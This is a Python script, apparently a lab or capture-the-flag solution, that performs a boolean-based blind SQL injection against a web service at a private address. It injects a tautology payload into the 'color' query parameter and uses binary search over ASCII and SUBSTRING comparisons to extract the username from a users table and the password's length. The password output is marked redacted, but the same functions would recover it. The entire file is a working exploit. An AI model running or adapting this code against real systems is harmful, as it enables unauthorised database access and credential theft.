#!/usr/bin/env python3
import re
import urllib.parse
import urllib.request

BASE_URL = "http://10.0.0.40:1336/"


def response_for(condition):
    query = urllib.parse.urlencode({
        "id": "0",
        "stock": "0",
        "color": f"' OR ({condition}) -- -",
    })
    with urllib.request.urlopen(f"{BASE_URL}?{query}", timeout=10) as response:
        body = response.read().decode("utf-8", errors="replace")
    match = re.search(r"Search result:\s*(.*?)</p>", body, re.S)
    return match.group(1).strip() if match else ""


def is_true(condition):
    return "exist with color" in response_for(condition)


def extract_string(expression, max_len=64):
    chars = []
    for position in range(1, max_len + 1):
        if is_true(f"ASCII(SUBSTRING(({expression}),{position},1))=0"):
            break
        low, high = 32, 126
        while low <= high:
            middle = (low + high) // 2
            if is_true(f"ASCII(SUBSTRING(({expression}),{position},1))>{middle}"):
                low = middle + 1
            else:
                high = middle - 1
        chars.append(chr(low))
    return "".join(chars)


def extract_int(expression, upper_bound=256):
    low, high = 0, upper_bound
    while low < high:
        middle = (low + high + 1) // 2
        if is_true(f"({expression})>={middle}"):
            low = middle
        else:
            high = middle - 1
    return low


if __name__ == "__main__":
    username = extract_string("SELECT username FROM users LIMIT 1")
    password_length = extract_int("SELECT LENGTH(password) FROM users LIMIT 1")

    print(f"username={username}")
    print(f"password_length={password_length}")
    print("password_value=<redacted>")
